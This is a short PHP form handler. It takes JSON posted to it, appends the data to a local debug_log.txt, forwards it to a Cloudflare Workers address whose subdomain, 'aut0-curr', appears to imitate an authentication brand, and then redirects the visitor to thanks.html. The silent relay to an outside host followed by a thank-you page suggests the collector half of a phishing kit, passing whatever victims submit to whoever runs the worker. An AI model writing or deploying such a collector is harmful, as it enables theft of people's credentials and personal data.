<?php
// Capture POST data
$data = json_decode(file_get_contents("php://input"), true);

// Log received data
file_put_contents("debug_log.txt", print_r($data, true), FILE_APPEND);

// Forward to Cloudflare Worker
$worker_url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";

$options = [
    "http" => [
        "header" => "Content-Type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($data),
    ],
];

$context = stream_context_create($options);
$response = file_get_contents($worker_url, false, $context);

// Log Worker response
file_put_contents("debug_log.txt", "Worker Response: " . print_r($http_response_header, true), FILE_APPEND);

// Redirect to thanks.html after sending
header("Location: ./thanks.html");
exit;
?>
